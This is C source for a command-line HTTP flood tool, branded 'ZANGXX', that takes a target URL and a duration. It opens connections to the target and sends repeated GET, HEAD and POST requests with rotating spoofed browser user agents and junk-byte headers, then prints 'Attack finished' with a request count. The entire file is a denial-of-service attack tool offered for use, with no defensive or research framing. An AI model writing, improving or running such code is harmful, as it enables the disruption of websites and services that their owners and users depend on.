#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <netdb.h>

char target_host[256];
char target_path[512] = "/";
int target_port = 80;
int duration = 30;
volatile long long total_requests = 0;
volatile int running = 1;

const char* user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0"
};

const char* null_hexs[] = {
    "\x00", "\xFF", "\xC2", "\xA0", "\x01", "\x02", "\x03", "\x04",
    "\x05", "\x06", "\x07", "\x08", "\x0B", "\x0C", "\x0E", "\x0F",
    "\x10", "\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17",
    "\x18", "\x19", "\x1A", "\x1B", "\x1C", "\x1D", "\x1E", "\x1F"
};

void parse_url(const char* url) {
    char url_copy[1024];
    strcpy(url_copy, url);
    
    char* protocol = strstr(url_copy, "://");
    if (protocol) {
        *protocol = '\0';
        protocol += 3;
        char* host_part = protocol;
        char* path_part = strchr(host_part, '/');
        
        if (path_part) {
            *path_part = '\0';
            strcpy(target_path, path_part);
        }
        
        char* port_part = strchr(host_part, ':');
        if (port_part) {
            *port_part = '\0';
            target_port = atoi(port_part + 1);
        } else {
            if (strstr(url, "https://")) {
                target_port = 443;
            } else {
                target_port = 80;
            }
        }
        
        strcpy(target_host, host_part);
    } else {
        strcpy(target_host, url_copy);
    }
}

void* flood_thread(void* arg) {
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    
    struct hostent* host = gethostbyname(target_host);
    if (!host) {
        printf("[ERROR] Gagal resolve host: %s\n", target_host);
        return NULL;
    }
    memcpy(&server_addr.sin_addr, host->h_addr_list[0], host->h_length);

    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        fcntl(sock, F_SETFL, O_NONBLOCK);

        int ret = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
        if (ret < 0 && errno != EINPROGRESS) {
            close(sock);
            continue;
        }

        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        struct timeval tv = {10, 0};
        if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
            close(sock);
            continue;
        }

        int i;
        for (i = 0; i < 50; i++) {
            if (!running) break;

            char ua[512];
            char nh[8];
            strcpy(ua, user_agents[rand() % 8]);
            strcpy(nh, null_hexs[rand() % 32]);

            char req_get[2048];
            snprintf(req_get, sizeof(req_get), 
                "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", 
                target_path, target_host, ua);
            send(sock, req_get, strlen(req_get), 0);
            total_requests++;

            char req_head[4096];
            snprintf(req_head, sizeof(req_head),
                "HEAD %s HTTP/1.1\r\nHost: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\n"
                "User-Agent: %s\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "Accept-Language: en-US,en;q=0.9\r\n"
                "Cache-Control: max-age=0\r\n"
                "Connection: Keep-Alive\r\n\r\n", 
                target_path, target_host, ua);
            send(sock, req_head, strlen(req_head), 0);
            total_requests++;

            char req_post[2048];
            snprintf(req_post, sizeof(req_post),
                "POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", 
                target_path, target_host, nh);
            send(sock, req_post, strlen(req_post), 0);
            total_requests++;
        }

        usleep(5000000);
        close(sock);
    }
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: ./raw <url> <time>\n");
        printf("Example: ./raw http://192.168.1.1:8080/ 30\n");
        printf("Example: ./raw https://example.com 60\n");
        return -1;
    }

    parse_url(argv[1]);
    duration = atoi(argv[2]);

    srand(time(NULL));

    printf("[ZANGXX] Target: %s:%d%s\n", target_host, target_port, target_path);
    printf("[ZANGXX] Duration: %d seconds\n", duration);
    printf("[ZANGXX] Starting flood...\n");

    pthread_t thread;
    pthread_create(&thread, NULL, flood_thread, NULL);

    sleep(duration);
    running = 0;

    pthread_join(thread, NULL);

    printf("[ZANGXX] Attack finished. Total requests: %lld\n", total_requests);
    return 0;
}